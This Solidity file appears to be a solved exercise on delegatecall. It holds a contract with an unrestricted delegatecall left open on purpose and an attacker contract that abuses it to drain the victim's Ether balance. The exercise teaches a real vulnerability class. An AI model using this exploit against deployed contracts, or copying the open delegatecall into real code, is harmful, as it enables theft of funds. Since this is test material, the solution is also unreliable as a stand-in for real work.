// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.28;

import {console} from "forge-std/console.sol";

contract GetEther {
    // write any code you like inside this contract, but only this contract
    // get the Ether from the HasEther contract. You may not modify the test

    function getEther(HasEther hasEther) external {
        //...

        bytes memory data = abi.encodeWithSignature("steal(address)", address(this));

        hasEther.action(address(this), data);
    }

    function steal(address to) external {
        payable(to).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract HasEther {
    error NotEnoughEther();

    constructor() payable {
        require(address(this).balance == 1 ether, NotEnoughEther());
    }

    function action(address to, bytes memory data) external {
        //delegate call will always run the code of callee contract but use the storage, balance of
        // called caller
        //like here DelegateCall will run the code of GetEther but will use the stroage, balance of
        //HasEther
        (bool success,) = address(to).delegatecall(data);
        require(success, "Action failed");
    }
}
